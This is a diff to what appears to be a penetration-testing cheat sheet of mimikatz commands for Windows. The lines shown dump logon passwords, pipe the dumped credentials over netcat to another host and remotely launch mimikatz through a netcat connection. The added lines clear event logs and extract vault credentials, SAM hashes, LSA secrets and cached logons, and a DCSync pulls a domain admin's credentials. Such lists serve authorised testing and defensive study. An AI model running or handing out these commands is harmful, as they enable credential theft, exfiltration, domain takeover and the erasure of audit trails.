@@ -16,7 +16,7 @@ net use \\192.168.19.1
 
 
 C:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir
-C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
+C:\>mimikatz.exe privilege::debug "sekurlsa::logonpasswords full" exit >> log.txt
 
 E:\>nc -lvp 4444
 C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.exe -vv 192.168.52.1 4444
@@ -24,6 +24,12 @@ C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | n
 
 C:\>nc -lvp 443
 E:\>nc.exe -vv 192.168.52.128 443 -e mimikatz.exe 
+
+
+privilege::debug  event::drop event::clear
+privilege::debug token::elevate vault::cred vault::list lsadump::sam lsadump::secrets lsadump::cache token::revert
+
+privilege::debug lsadump::dcsync /domain:xx.local /user:admin (/dc:)
 
 
 
